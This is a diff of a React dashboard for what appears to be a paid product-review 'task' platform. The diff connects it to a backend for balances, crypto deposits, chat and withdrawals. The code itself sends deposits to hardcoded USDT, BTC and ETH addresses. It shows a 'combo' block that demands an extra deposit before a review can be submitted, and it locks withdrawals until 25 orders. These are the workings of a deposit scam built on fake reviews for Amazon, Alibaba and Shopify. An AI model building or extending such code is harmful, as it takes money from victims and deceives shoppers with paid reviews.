@@ -1,5 +1,6 @@
 import React, { useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
+import { API_BASE } from '../config';
 import { 
   Menu,
   X,
@@ -40,7 +41,8 @@ import {
   Plus,
   Home,
   MessageSquare,
-  Send
+  Send,
+  Paperclip
 } from 'lucide-react';
 import { Product } from '../types';
 
@@ -284,9 +286,211 @@ export default function DashboardPage({
   const [chatInputText, setChatInputText] = useState('');
   const [isChatTyping, setIsChatTyping] = useState(false);
 
+  const fetchAllData = async () => {
+    const token = localStorage.getItem('reviewer_auth_token');
+    if (!token) {
+      onLogout();
+      return;
+    }
+
+    try {
+      // 1. Fetch User details, balances, and system settings configurations
+      const userRes = await fetch(`${API_BASE}/auth/me`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+      });
+      if (!userRes.ok) {
+        onLogout();
+        return;
+      }
+      const userData = await userRes.json();
+
+      // Update balances state
+      if (userData.balances) {
+        setPlatformsData({
+          Amazon: {
+            walletBalance: userData.balances.Amazon.walletBalance,
+            completedOrders: userData.balances.Amazon.completedReviewsCount,
+            pendingReviews: 0,
+            profitEarned: Number((userData.balances.Amazon.completedReviewsCount * 1.5).toFixed(2)),
+            orders: []
+          },
+          Alibaba: {
+            walletBalance: userData.balances.Alibaba.walletBalance,
+            completedOrders: userData.balances.Alibaba.completedReviewsCount,
+            pendingReviews: 0,
+            profitEarned: Number((userData.balances.Alibaba.completedReviewsCount * 1.5).toFixed(2)),
+            orders: []
+          },
+          Shopify: {
+            walletBalance: userData.balances.Shopify.walletBalance,
+            completedOrders: userData.balances.Shopify.completedReviewsCount,
+            pendingReviews: 0,
+            profitEarned: Number((userData.balances.Shopify.completedReviewsCount * 1.5).toFixed(2)),
+            orders: []
+          }
+        });
+
+        // Resolve workspace locks dynamically
+        const amzActive = userData.balances.Amazon.walletBalance > 0 || userData.balances.Amazon.completedReviewsCount > 0;
+        const aliActive = userData.balances.Alibaba.walletBalance > 0 || userData.balances.Alibaba.completedReviewsCount > 0;
+        const shoActive = userData.balances.Shopify.walletBalance > 0 || userData.balances.Shopify.completedReviewsCount > 0;
+
+        if (amzActive) {
+          setEnabledPlatform('Amazon');
+          if (!activePlatform) setActivePlatform('Amazon');
+        } else if (aliActive) {
+          setEnabledPlatform('Alibaba');
+          if (!activePlatform) setActivePlatform('Alibaba');
+        } else if (shoActive) {
+          setEnabledPlatform('Shopify');
+          if (!activePlatform) setActivePlatform('Shopify');
+        }
+      }
+
+      // Update bound wallet address mapping state
+      if (userData.boundUsdtAddress) {
+        setDefaultWalletAddress(userData.boundUsdtAddress);
+        setWithdrawAddress(userData.boundUsdtAddress);
+        setIsAddressBound(true);
+      } else {
+        setIsAddressBound(false);
+      }
+
+      // Update dynamic configuration wallets and links
+      if (userData.systemConfig) {
+        setDepositAddresses({
+          'USDT-TRC20': userData.systemConfig.trc20_address || 'TTisWCo1GTszkukUB6gmmdPRaXYsBATJKM',
+          'USDT-ERC20': userData.systemConfig.erc20_address || '0xde833b4707431ffa4fcd62da08219172a8360d95',
+          'BTC': userData.systemConfig.btc_address || 'bc1q5kt8tzmkvk52xr6ty0n55v5lc0nahwv6xpu8zs',
+          'ETH': userData.systemConfig.erc20_address || '0xde833b4707431ffa4fcd62da08219172a8360d95'
+        });
+        if (userData.systemConfig.telegram_link) {
+          setTelegramSupportLink(userData.systemConfig.telegram_link);
+        }
+        if (userData.systemConfig.notification_banner) {
+          setMarqueeNotificationText(userData.systemConfig.notification_banner);
+        }
+      }
+
+      // 2. Fetch transaction logs (Deposits & Withdrawals)
+      const historyRes = await fetch(`${API_BASE}/transactions/history`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+      });
+      if (historyRes.ok) {
+        const historyData = await historyRes.json();
+        const deps = historyData.filter((x: any) => x.type === 'Deposit');
+        const withs = historyData.filter((x: any) => x.type === 'Withdrawal');
+        setDeposits(deps);
+        setWithdrawals(withs);
+      }
+
+      // 3. Fetch review submissions history to merge in platform logs
+      const subsRes = await fetch(`${API_BASE}/reviews/submissions`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+      });
+      if (subsRes.ok) {
+        const subsData = await subsRes.json();
+        setPlatformsData(prev => {
+          const amzOrders = subsData.filter((x: any) => x.platform === 'Amazon');
+          const aliOrders = subsData.filter((x: any) => x.platform === 'Alibaba');
+          const shoOrders = subsData.filter((x: any) => x.platform === 'Shopify');
+
+          return {
+            Amazon: { ...prev.Amazon, orders: amzOrders, pendingReviews: amzOrders.filter((o: any) => o.status === 'Pending').length },
+            Alibaba: { ...prev.Alibaba, orders: aliOrders, pendingReviews: aliOrders.filter((o: any) => o.status === 'Pending').length },
+            Shopify: { ...prev.Shopify, orders: shoOrders, pendingReviews: shoOrders.filter((o: any) => o.status === 'Pending').length }
+          };
+        });
+      }
+
+      // 4. Fetch chat logs
+      const chatRes = await fetch(`${API_BASE}/chat/history`, {
+        headers: { 'Authorization': `Bearer ${token}` }
+      });
+      if (chatRes.ok) {
+        const chatData = await chatRes.json();
+        setChatMessages(chatData);
+      }
+
+      setLastRefreshed(new Date().toLocaleTimeString());
+    } catch (err) {
+      console.warn("Active session data sync error:", err);
+    }
+  };
+
   useEffect(() => {
-    sessionStorage.setItem('support_chat_history', JSON.stringify(chatMessages));
-  }, [chatMessages]);
+    fetchAllData();
+    const interval = setInterval(fetchAllData, 60000); // Low-frequency fallback poll
+    return () => clearInterval(interval);
+  }, [activePlatform]);
+
+  useEffect(() => {
+    const token = localStorage.getItem('reviewer_auth_token');
+    if (!token) return;
+
+    // Dynamically calculate WS endpoint from REST API base
+    const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+    const wsHost = API_BASE.includes('localhost') 
+      ? 'localhost:5000' 
+      : window.location.host;
+    
+    const wsUrl = `${wsProto}//${wsHost}?token=${encodeURIComponent(token)}`;
+    const ws = new WebSocket(wsUrl);
+
+    ws.onmessage = (event) => {
+      try {
+        const message = JSON.parse(event.data);
+        if (message.type === 'balance_update' || message.type === 'approval_notice') {
+          fetchAllData();
+          showToast(`⚡ Real-time updates synchronized successfully.`);
+        }
+      } catch (err) {
+        console.error("Error handling real-time socket packet:", err);
+      }
+    };
+
+    ws.onerror = (err) => {
+      console.warn("Real-time WebSocket connection error:", err);
+    };
+
+    return () => {
+      ws.close();
+    };
+  }, [activePlatform]);
+
+  useEffect(() => {
+    if (!activePlatform) {
+      setAssignedProducts([]);
+      return;
+    }
+
+    const token = localStorage.getItem('reviewer_auth_token');
+    if (!token) return;
+
+    fetch(`${API_BASE}/reviews/products?platform=${activePlatform}`, {
+      headers: { 'Authorization': `Bearer ${token}` }
+    })
+      .then(res => res.json())
+      .then(data => {
+        if (Array.isArray(data) && data.length > 0) {
+          setAssignedProducts(data.map((p: any) => ({
+            id: p.id,
+            title: p.title,
+            category: p.category,
+            image: p.image_url,
+            payout: parseFloat(p.payout),
+            difficulty: p.difficulty,
+            wordLimit: p.word_limit,
+            externalLink: p.external_link
+          })));
+        } else {
+          setAssignedProducts(ASSIGNED_PRODUCTS[activePlatform]);
+        }
+      })
+      .catch(() => {
+        setAssignedProducts(ASSIGNED_PRODUCTS[activePlatform]);
+      });
+  }, [activePlatform]);
 
   // Settings States
   const [settingsUsername, setSettingsUsername] = useState(username);
@@ -295,10 +499,20 @@ export default function DashboardPage({
   const [emailNotifToggle, setEmailNotifToggle] = useState(true);
   const [telegramNotifToggle, setTelegramNotifToggle] = useState(false);
   const [browserNotifToggle, setBrowserNotifToggle] = useState(true);
-  const [defaultWalletAddress, setDefaultWalletAddress] = useState('TXdfH78ajH7aKjH8sKjD9sKa71La9aKs8F');
+  const [defaultWalletAddress, setDefaultWalletAddress] = useState('');
+  const [isAddressBound, setIsAddressBound] = useState(false);
   const [defaultNetwork, setDefaultNetwork] = useState('TRC-20');
   const [settingsLanguage, setSettingsLanguage] = useState('English');
   const [settingsTimezone, setSettingsTimezone] = useState('UTC+5');
+
+  // Combo system warning modal states
+  const [isComboModalOpen, setIsComboModalOpen] = useState(false);
+  const [comboModalDetails, setComboModalDetails] = useState<{
+    triggerBalance: number;
+    currentBalance: number;
+    requiredDeposit: number;
+    position: number;
+  } | null>(null);
 
   // Interactive settings and help tabs states
   const [settingsSubTab, setSettingsSubTab] = useState<'account' | 'notifications' | 'wallet' | 'danger'>('account');
@@ -351,12 +565,15 @@ export default function DashboardPage({
 
   // Profile details
   const [cryptoNetwork, setCryptoNetwork] = useState('USDT-TRC20');
-  const depositAddresses: Record<string, string> = {
-    'USDT-TRC20': 'TXdfH78ajH7aKjH8sKjD9sKa71La9aKs8F',
-    'USDT-ERC20': '0x71C7656EC7ab88b098defB751B7401B5f6d8976F',
-    'BTC': '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',
-    'ETH': '0x3c4c9fa8f522851a70b02130c007fb1b151121df'
-  };
+  const [depositAddresses, setDepositAddresses] = useState<Record<string, string>>({
+    'USDT-TRC20': 'TTisWCo1GTszkukUB6gmmdPRaXYsBATJKM',
+    'USDT-ERC20': '0xde833b4707431ffa4fcd62da08219172a8360d95',
+    'BTC': 'bc1q5kt8tzmkvk52xr6ty0n55v5lc0nahwv6xpu8zs',
+    'ETH': '0xde833b4707431ffa4fcd62da08219172a8360d95'
+  });
+  const [telegramSupportLink, setTelegramSupportLink] = useState('https://t.me/Customerservicecentre01');
+  const [marqueeNotificationText, setMarqueeNotificationText] = useState('⚡ Automated Review Verification & Instant Payouts Active!');
+  const [assignedProducts, setAssignedProducts] = useState<AssignedProduct[]>([]);
 
   // Withdraw request modal (only relevant when they click Withdraw, although locked unless 25+ orders)
   const [isWithdrawOpen, setIsWithdrawOpen] = useState(false);
@@ -462,53 +679,119 @@ export default function DashboardPage({
     showToast("✓ Withdrawal security password changed successfully.");
   };
 
-  const handleSendChatMessage = (e: React.FormEvent) => {
+  const triggerUserImageAttach = () => {
+    document.getElementById('userImageAttachInput')?.click();
+  };
+
+  const handleUserImageUpload = async (e: React.ChangeEvent<HTMLInputElement>) => {
+    const file = e.target.files?.[0];
+    if (!file) return;
+
+    if (file.size > 10 * 1024 * 1024) {
+      showToast("File is too large. Please select an image under 10MB.");
+      return;
+    }
+
+    const reader = new FileReader();
+    reader.onload = async (event) => {
+      const base64 = event.target.result as string;
+      try {
+        showToast("Uploading attachment screenshot...");
+        const token = localStorage.getItem('reviewer_auth_token');
+        const res = await fetch(`${API_BASE}/chat/upload`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'Authorization': `Bearer ${token}`
+          },
+          body: JSON.stringify({ image: base64 })
+        });
+        const data = await res.json();
+
+        if (res.ok) {
+          const optMsg = {
+            id: `msg-opt-${Date.now()}`,
+            sender: 'user' as const,
+            text: data.imageUrl,
+            time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+          };
+          setChatMessages(prev => [...prev, optMsg]);
+
+          const sendRes = await fetch(`${API_BASE}/chat/send`, {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+              'Authorization': `Bearer ${token}`
+            },
+            body: JSON.stringify({
+              text: data.imageUrl,
+              time: optMsg.time
+            })
+          });
+          if (sendRes.ok) {
+            showToast("✓ Image uploaded successfully!");
+            const chatRes = await fetch(`${API_BASE}/chat/history`, {
+              headers: { 'Authorization': `Bearer ${token}` }
+            });
+            if (chatRes.ok) {
+              const chatData = await chatRes.json();
+              setChatMessages(chatData);
+            }
+          }
+        } else {
+          showToast(data.error || "Failed to upload image.");
+        }
+      } catch (err) {
+        showToast("Image upload server connection error.");
+      }
+    };
+    reader.readAsDataURL(file);
+  };
+
+  const handleSendChatMessage = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!chatInputText.trim()) return;
 
     const userMsgText = chatInputText;
-    const now = new Date();
-    const timeStr = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    setChatInputText('');
 
-    // Append user message
-    const newUserMsg = {
-      id: `msg-user-${Date.now()}`,
+    const timeVal = new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+    const optMsg = {
+      id: `msg-opt-${Date.now()}`,
       sender: 'user' as const,
       text: userMsgText,
-      time: timeStr
+      time: timeVal
     };
+    setChatMessages(prev => [...prev, optMsg]);
 
-    setChatMessages(prev => [...prev, newUserMsg]);
-    setChatInputText('');
-    setIsChatTyping(true);
+    try {
+      const token = localStorage.getItem('reviewer_auth_token');
+      const res = await fetch(`${API_BASE}/chat/send`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({
+          text: userMsgText,
+          time: timeVal
+        })
+      });
 
-    // Simulate Agent reply after 1.5s
-    setTimeout(() => {
-      setIsChatTyping(false);
-      
-      let replyText = "Thank you for reaching out. An operator will review your message shortly. Please state your username and transaction details (deposit/withdrawal addresses) if applicable.";
-      
-      // Smart replies based on keywords
-      const textLower = userMsgText.toLowerCase();
-      if (textLower.includes('deposit') || textLower.includes('recharge')) {
-        replyText = "For deposit issues, please provide the TXID (hash), the deposit protocol network (TRC-20/ERC-20), and screenshot proof. Deposits are automatically credited within 2 confirmations.";
-      } else if (textLower.includes('withdraw') || textLower.includes('payout')) {
-        replyText = "Withdrawals are unlocked after completing the 25 reviews threshold. Ensure your receiving address is correct. Processing takes 5-30 minutes.";
-      } else if (textLower.includes('task') || textLower.includes('order') || textLower.includes('combo')) {
-        replyText = "Evaluation gigs are generated automatically based on your active workspace balance. If you are locked, please complete your minimum deposit or wait for the ledger sync to complete.";
-      } else if (textLower.includes('hello') || textLower.includes('hi') || textLower.includes('hey')) {
-        replyText = "Hello! Support agent here. How can I help you today? Please describe your query or copy-paste any error message.";
+      if (res.ok) {
+        const chatRes = await fetch(`${API_BASE}/chat/history`, {
+          headers: { 'Authorization': `Bearer ${token}` }
+        });
+        if (chatRes.ok) {
+          const chatData = await chatRes.json();
+          setChatMessages(chatData);
+        }
+      } else {
+        showToast("Failed to transmit support message.");
       }
-
-      const agentMsg = {
-        id: `msg-agent-${Date.now()}`,
-        sender: 'support' as const,
-        text: replyText,
-        time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
-      };
-
-      setChatMessages(prev => [...prev, agentMsg]);
-    }, 1500);
+    } catch (err) {
+      showToast("Support message transmission network error.");
+    }
   };
 
   // Notification actions
@@ -550,53 +833,77 @@ export default function DashboardPage({
     showToast("Order ID registered. Payout pending verification. Write review.");
   };
 
-  const handleStep3Complete = (e: React.FormEvent) => {
+  const handleStep3Complete = async (e: React.FormEvent) => {
     e.preventDefault();
+    if (!activeReviewProduct) return;
     const wordsCount = reviewDraftText.trim().split(/\s+/).filter(Boolean).length;
-    if (wordsCount < (activeReviewProduct?.wordLimit || 20)) {
-      showToast(`Review draft is too short! Write at least ${activeReviewProduct?.wordLimit} words.`);
+    if (wordsCount < (activeReviewProduct.wordLimit || 20)) {
+      showToast(`Review draft is too short! Write at least ${activeReviewProduct.wordLimit} words.`);
       return;
     }
-    setReviewStep(4);
-    showToast("Review submitted! Placed in merchant authorization queue.");
+
+    try {
+      const token = localStorage.getItem('reviewer_auth_token');
+      const res = await fetch(`${API_BASE}/reviews/submit`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({
+          productId: activeReviewProduct.id,
+          orderId: inputOrderId,
+          reviewText: reviewDraftText
+        })
+      });
+      const data = await res.json();
+
+      if (!res.ok) {
+        if (data.error === 'COMBO_BLOCK' || res.status === 403) {
+          setComboModalDetails({
+            triggerBalance: data.triggerBalance || 0,
+            currentBalance: data.currentBalance || 0,
+            requiredDeposit: Number(((data.triggerBalance || 0) - (data.currentBalance || 0)).toFixed(2)),
+            position: data.position || 0
+          });
+          setIsComboModalOpen(true);
+          return;
+        }
+        showToast(data.error || 'Submission failed');
+        return;
+      }
+
+      setReviewStep(4);
+      showToast("Review submitted! Placed in merchant authorization queue.");
+      fetchAllData();
+    } catch (err) {
+      showToast('Server connection error. Failed to submit draft.');
+    }
   };
 
   // Simulate Admin/Merchant Approving the review and crediting real money
-  const handleSimulateAdminApproval = () => {
-    if (!activeReviewProduct) return;
-    
-    const payout = activeReviewProduct.payout;
-    
-    setPlatformsData(prev => {
-      const pData = prev[activePlatform];
-      const newOrder: OrderRecord = {
-        id: `ord-${activePlatform.toLowerCase()}-${Date.now()}`,
-        productTitle: activeReviewProduct.title,
-        orderId: inputOrderId || "SIM-ORDER-991A",
-        payout: payout,
-        status: 'Completed',
-        date: new Date().toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' }),
-        reviewText: reviewDraftText
-      };
-      
-      return {
-        ...prev,
-        [activePlatform]: {
-          ...pData,
-          walletBalance: Number((pData.walletBalance + payout).toFixed(2)),
-          completedOrders: pData.completedOrders + 1,
-          profitEarned: Number((pData.profitEarned + payout).toFixed(2)),
-          orders: [newOrder, ...pData.orders.filter(o => o.productTitle !== activeReviewProduct.title)]
-        }
-      };
-    });
-
-    showToast(`Success! Merchant approved task. +$${payout.toFixed(2)} credited to your ${activePlatform} Wallet!`);
-    setActiveReviewProduct(null);
+  const handleSimulateAdminApproval = async () => {
+    try {
+      const token = localStorage.getItem('reviewer_auth_token');
+      const res = await fetch(`${API_BASE}/reviews/override-approve`, {
+        method: 'POST',
+        headers: { 'Authorization': `Bearer ${token}` }
+      });
+      if (res.ok) {
+        showToast(`Success! Developer Simulation Approved. Balances synced!`);
+        setActiveReviewProduct(null);
+        setReviewStep(1);
+        fetchAllData();
+      } else {
+        showToast('Override approval failed.');
+      }
+    } catch (e) {
+      showToast('API network connection error.');
+    }
   };
 
   // Handle withdraw submission
-  const handleWithdrawRequest = (e: React.FormEvent) => {
+  const handleWithdrawRequest = async (e: React.FormEvent) => {
     e.preventDefault();
     const amount = parseFloat(withdrawAmount);
     if (isNaN(amount) || amount <= 0) {
@@ -612,26 +919,35 @@ export default function DashboardPage({
       return;
     }
 
-    setPlatformsData(prev => {
-      const pData = prev[activePlatform];
-      return {
-        ...prev,
-        [activePlatform]: {
-          ...pData,
-          walletBalance: Number((pData.walletBalance - amount).toFixed(2)),
-          orders: pData.orders // maintain orders
-        }
-      };
-    });
+    try {
+      const token = localStorage.getItem('reviewer_auth_token');
+      const res = await fetch(`${API_BASE}/transactions/withdraw`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({ amount, address: withdrawAddress, platform: activePlatform })
+      });
+      const data = await res.json();
 
-    showToast(`Withdrawal request of $${amount.toFixed(2)} USD successfully queued for TRC-20 release.`);
-    setIsWithdrawOpen(false);
-    setWithdrawAmount('');
-    setWithdrawAddress('');
+      if (!res.ok) {
+        showToast(data.error || 'Withdrawal request failed');
+        return;
+      }
+
+      showToast(`Withdrawal request of $${amount.toFixed(2)} USD successfully queued.`);
+      setIsWithdrawOpen(false);
+      setWithdrawAmount('');
+      setWithdrawAddress('');
+      fetchAllData();
+    } catch (err) {
+      showToast('Server connection error. Failed to queue withdrawal.');
+    }
   };
 
   // Submit deposit request
-  const handleDepositSubmit = (e: React.FormEvent) => {
+  const handleDepositSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     const amount = parseFloat(newDepositAmount);
     if (isNaN(amount) || amount <= 0) {
@@ -642,63 +958,82 @@ export default function DashboardPage({
       showToast("Please paste the transaction hash or TxID.");
       return;
     }
-    
-    const newRequest: DepositRequest = {
-      id: `dep-${Date.now()}`,
-      protocol: selectedProtocol,
-      amount: amount,
-      txHash: newDepositTxHash,
-      remark: newDepositRemark,
-      status: 'Pending',
-      date: new Date().toLocaleDateString('en-US', { month: 'short', day: '2-digit', year: 'numeric' }),
-      platform: depositTargetPlatform
-    };
 
-    setDepositRequests(prev => [newRequest, ...prev]);
-    setNewDepositAmount('');
-    setNewDepositTxHash('');
-    setNewDepositRemark('');
-    showToast(`Deposit request submitted for ${depositTargetPlatform}! Awaiting administrator approval.`);
+    try {
+      const token = localStorage.getItem('reviewer_auth_token');
+      const res = await fetch(`${API_BASE}/transactions/deposit`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({
+          platform: depositTargetPlatform,
+          protocol: selectedProtocol,
+          amount: amount,
+          txHash: newDepositTxHash,
+          remark: newDepositRemark
+        })
+      });
+      const data = await res.json();
+
+      if (!res.ok) {
+        showToast(data.error || 'Deposit submission failed');
+        return;
+      }
+
+      setNewDepositAmount('');
+      setNewDepositTxHash('');
+      setNewDepositRemark('');
+      showToast(`Deposit request submitted for ${depositTargetPlatform}! Awaiting administrator approval.`);
+      fetchAllData();
+    } catch (err) {
+      showToast('Server connection error. Failed to submit deposit.');
+    }
   };
 
   // Simulate deposit approval
-  const handleSimulateApprove = (id: string, amount: number) => {
-    let reqPlatform: 'Amazon' | 'Alibaba' | 'Shopify' = 'Amazon';
-    setDepositRequests(prev => prev.map(req => {
-      if (req.id === id) {
-        reqPlatform = req.platform;
-        return { ...req, status: 'Approved' };
+  const handleSimulateApprove = async (id: string, amount: number) => {
+    try {
+      const token = localStorage.getItem('reviewer_auth_token');
+      const res = await fetch(`${API_BASE}/transactions/override-approve-deposit`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({ depositId: id })
+      });
+      if (res.ok) {
+        showToast(`Simulation: Deposit request approved and balance synced!`);
+        fetchAllData();
+      } else {
+        showToast('Bypass approval failed.');
       }
-      return req;
-    }));
-
-    // Update active platform's wallet balance
-    setPlatformsData(prev => {
-      const pData = prev[reqPlatform];
-      return {
-        ...prev,
-        [reqPlatform]: {
-          ...pData,
-          walletBalance: Number((pData.walletBalance + amount).toFixed(2)),
-          orders: pData.orders
-        }
-      };
-    });
-
-    setEnabledPlatform(reqPlatform);
-    setActivePlatform(reqPlatform);
-    showToast(`Simulation: Deposit request approved! $${amount.toFixed(2)} credited to your active ${reqPlatform} wallet balance. Workspace unlocked!`);
+    } catch (err) {
+      showToast('Bypass connection error.');
+    }
   };
 
   // Simulate deposit rejection
-  const handleSimulateReject = (id: string) => {
-    setDepositRequests(prev => prev.map(req => {
-      if (req.id === id) {
-        return { ...req, status: 'Rejected' };
+  const handleSimulateReject = async (id: string) => {
+    try {
+      const token = localStorage.getItem('reviewer_auth_token');
+      const res = await fetch(`${API_BASE}/transactions/override-reject-deposit`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'Authorization': `Bearer ${token}`
+        },
+        body: JSON.stringify({ depositId: id })
+      });
+      if (res.ok) {
+        showToast("Simulation: Deposit request rejected.");
+        fetchAllData();
       }
-      return req;
-    }));
-    showToast("Simulation: Deposit request rejected.");
+    } catch (err) {
+      showToast('Bypass rejection error.');
+    }
   };
 
   // Reusable Network/Platform workspace selector bar (moved to header dropdown)
@@ -921,6 +1256,8 @@ export default function DashboardPage({
           </div>
         </div>
       </header>
+
+
 
       <div className="flex-1 flex overflow-hidden">
         
@@ -1273,7 +1610,7 @@ export default function DashboardPage({
                     <div className="space-y-3">
                       <h3 className="text-sm font-black text-gray-800 uppercase tracking-wider">Active Evaluation Gigs</h3>
                       <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                        {ASSIGNED_PRODUCTS[activePlatform].slice(0, 2).map((prod) => (
+                        {assignedProducts.slice(0, 2).map((prod) => (
                           <div key={prod.id} className="bg-white p-4 rounded-xl border border-gray-200 flex items-center space-x-4">
                             <img src={prod.image} alt={prod.title} className="h-14 w-14 object-contain rounded border border-gray-100 p-1 bg-gray-50 flex-shrink-0" />
                             <div className="flex-1 min-w-0">
@@ -1401,20 +1738,13 @@ export default function DashboardPage({
                         <input
                           type="text"
                           readOnly
-                          value={
-                            selectedProtocol === 'TRC-20' ? 'TTisWCo1GTszkukUB6gmmdPRaXYsBATJKM' :
-                            selectedProtocol === 'ERC-20' ? '0xde833b4707431ffa4fcd62da08219172a8360d95' :
-                            'bc1q5kt8tzmkvk52xr6ty0n55v5lc0nahwv6xpu8zs'
-                          }
+                          value={depositAddresses[selectedProtocol] || ''}
                           className="flex-1 px-3 py-2.5 text-xs font-mono bg-transparent text-gray-800 select-all focus:outline-none"
                         />
                         <button
                           type="button"
                           onClick={() => {
-                            const addr = selectedProtocol === 'TRC-20' ? 'TTisWCo1GTszkukUB6gmmdPRaXYsBATJKM' :
-                                         selectedProtocol === 'ERC-20' ? '0xde833b4707431ffa4fcd62da08219172a8360d95' :
-                                         'bc1q5kt8tzmkvk52xr6ty0n55v5lc0nahwv6xpu8zs';
-                            handleCopyText(addr, "Deposit Address");
+                            handleCopyText(depositAddresses[selectedProtocol] || '', "Deposit Address");
                           }}
                           className="px-4 bg-[#131921] hover:bg-black text-white text-xs font-bold flex items-center space-x-1 cursor-pointer transition-colors"
                         >
@@ -1667,7 +1997,7 @@ export default function DashboardPage({
 
                     {/* Tasks Grid */}
                     {(() => {
-                      const filteredProducts = ASSIGNED_PRODUCTS[activePlatform].filter(product => {
+                      const filteredProducts = assignedProducts.filter(product => {
                         const matchesSearch = product.title.toLowerCase().includes(gigsSearch.toLowerCase()) || 
                                               product.category.toLowerCase().includes(gigsSearch.toLowerCase());
                         const matchesDifficulty = gigsDifficulty === 'All' || product.difficulty === gigsDifficulty;
@@ -2445,9 +2775,18 @@ export default function DashboardPage({
                                 ? 'bg-[#131921] border-[#131921] text-white rounded-tr-none'
                                 : 'bg-white border-gray-200 text-gray-800 rounded-tl-none'
                             }`}>
-                              <p className="leading-relaxed whitespace-pre-wrap">{msg.text}</p>
+                              {msg.text.startsWith('data:image/') || msg.text.startsWith('/uploads/') ? (
+                                <img 
+                                  src={msg.text.startsWith('/') ? `${API_BASE.replace('/api', '')}${msg.text}` : msg.text} 
+                                  alt="Screenshot proof" 
+                                  className="max-w-xs rounded-lg border shadow-3xs cursor-pointer hover:opacity-90 transition" 
+                                  onClick={() => window.open(msg.text.startsWith('/') ? `${API_BASE.replace('/api', '')}${msg.text}` : msg.text, '_blank')}
+                                />
+                              ) : (
+                                <p className="leading-relaxed whitespace-pre-wrap">{msg.text}</p>
+                              )}
                               <span className={`block text-[9px] mt-1.5 text-right font-mono ${
-                                msg.sender === 'user' ? 'text-gray-400' : 'text-gray-405'
+                                msg.sender === 'user' ? 'text-gray-400' : 'text-gray-450'
                               }`}>
                                 {msg.time}
                               </span>
@@ -2472,7 +2811,23 @@ export default function DashboardPage({
                     </div>
 
                     {/* Input Form Box */}
-                    <form onSubmit={handleSendChatMessage} className="bg-white p-3 border-t border-gray-200 flex items-center space-x-2.5">
+                    <form onSubmit={handleSendChatMessage} className="bg-white p-3 border-t border-gray-200 flex items-center space-x-2">
+                      <button 
+                        type="button" 
+                        onClick={triggerUserImageAttach}
+                        title="Upload proof screenshot"
+                        className="p-2 border border-gray-300 hover:bg-gray-50 rounded-xl text-gray-500 hover:text-gray-700 transition cursor-pointer flex-shrink-0"
+                      >
+                        <Paperclip className="h-4 w-4" />
+                      </button>
+                      <input 
+                        type="file" 
+                        id="userImageAttachInput" 
+                        accept="image/*" 
+                        className="hidden" 
+                        onChange={handleUserImageUpload}
+                      />
+
                       <input
                         type="text"
                         value={chatInputText}
@@ -2491,7 +2846,7 @@ export default function DashboardPage({
 
                     {/* Browser Session Note */}
                     <div className="bg-gray-100 border-t border-gray-200 px-4 py-2.5 text-[9px] text-gray-500 italic text-center font-medium font-sans">
-                      Note: Your chat history is saved locally in this browser session for privacy.
+                      Note: Support chat transcripts are securely archived on remote synchronization channels.
                     </div>
                   </div>
 
@@ -2512,7 +2867,7 @@ export default function DashboardPage({
                         </p>
                       </div>
                       <a 
-                        href="https://t.me/Customerservicecentre01" 
+                        href={telegramSupportLink} 
                         target="_blank" 
                         rel="noopener noreferrer"
                         className="block w-full py-2.5 bg-[#0088cc] hover:bg-[#0077b3] text-white font-bold text-xs rounded-xl transition shadow-xs text-center"
@@ -2764,9 +3119,33 @@ export default function DashboardPage({
                     {/* Sub-tab: Payout Wallets */}
                     {settingsSubTab === 'wallet' && (
                       <form
-                        onSubmit={(e) => {
+                        onSubmit={async (e) => {
                           e.preventDefault();
-                          showToast("USDT default payment coordinates locked!");
+                          if (isAddressBound) return;
+                          if (!defaultWalletAddress.trim()) {
+                            showToast("Wallet address cannot be empty.");
+                            return;
+                          }
+                          try {
+                            const token = localStorage.getItem('reviewer_auth_token');
+                            const res = await fetch(`${API_BASE}/auth/bind-usdt`, {
+                              method: 'PUT',
+                              headers: {
+                                'Content-Type': 'application/json',
+                                'Authorization': `Bearer ${token}`
+                              },
+                              body: JSON.stringify({ address: defaultWalletAddress })
+                            });
+                            const data = await res.json();
+                            if (res.ok) {
+                              showToast("✓ USDT withdrawal address successfully bound and locked!");
+                              fetchAllData();
+                            } else {
+                              showToast(data.error || "Failed to bind wallet address.");
+                            }
+                          } catch (err) {
+                            showToast("Connection error binding address.");
+                          }
                         }}
                         className="space-y-4 animate-fadeIn"
                       >
@@ -2777,7 +3156,8 @@ export default function DashboardPage({
                           <select
                             value={defaultNetwork}
                             onChange={(e) => setDefaultNetwork(e.target.value)}
-                            className="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded-lg text-xs font-bold text-gray-800 focus:outline-none"
+                            disabled={isAddressBound}
+                            className="w-full px-3 py-2 bg-gray-50 border border-gray-300 rounded-lg text-xs font-bold text-gray-800 focus:outline-none disabled:opacity-60"
                           >
                             <option value="TRC-20">TRC-20 Network (Tron Smart Contract)</option>
                             <option value="ERC-20">ERC-20 Network (Ethereum Virtual Machine)</option>
@@ -2789,21 +3169,27 @@ export default function DashboardPage({
